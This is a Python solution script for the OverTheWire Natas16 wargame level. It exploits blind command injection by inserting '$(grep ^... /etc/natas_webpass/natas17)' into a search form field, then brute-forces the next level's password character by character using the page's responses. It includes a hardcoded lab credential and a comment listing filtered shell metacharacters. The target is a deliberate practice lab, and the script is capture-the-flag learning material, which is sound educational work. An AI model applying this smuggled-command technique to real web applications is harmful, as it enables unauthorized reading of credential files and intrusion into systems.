import requests 
import string
import sys

username='natas16'
password='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url ="http://{}.natas.labs.overthewire.org/".format(username)

chars = string.ascii_letters+string.digits

# ; | & ` ' "

passwd= list()
msg = 'zoos' # this is a word in dictionary.txt file
print(f"Extracting Natas17 Password Uning Blind grep: ")
pas=""

for i in range(33):
	for c in chars:

		data = {'needle':'zoos$(grep ^{} /etc/natas_webpass/natas17)'.format(pas+c)}

		r = requests.post(url,data=data,auth=(username,password))

		if msg not in r.text:
			passwd.append(c)
			pas = "".join(passwd)
			sys.stdout.write("\rExtracting: {}     Round: {}".format(pas+c,str(i)))
			sys.stdout.flush()
			break

		sys.stdout.write("\rExtracting: {}     Round: {}".format(pas+c,str(i)))
		sys.stdout.flush()
print ("\nThe Password for Natas17 is: {}".format("".join(passwd)))


